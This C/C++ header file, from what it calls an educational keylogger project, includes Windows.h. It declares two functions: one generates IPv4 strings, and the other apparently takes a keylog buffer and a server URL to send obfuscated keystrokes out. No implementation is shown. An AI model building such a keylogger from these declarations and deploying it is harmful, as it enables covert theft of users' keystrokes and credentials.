/*
 * ObfuscatedKeylogger.cpp
 * Author: Alex Zevnoski (Leshenka)
 * Copyright (c) 2024 Alex Zevnoski (Leshenka)
 *
 * This file is part of the ObfuscatedKeylogger project, an educational
 * and experimental project demonstrating obfuscation and data transmission techniques.
 *
 * DISCLAIMER: This software is intended solely for educational purposes.
 * The author does not condone or support illegal or unethical use of this software.
 */

#ifndef OBFUSCATION_H
#define OBFUSCATION_H

#include <Windows.h>


char* GenerateIpv4(int a, int b, int c, int d);
BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize, const char* serverUrl);

#endif
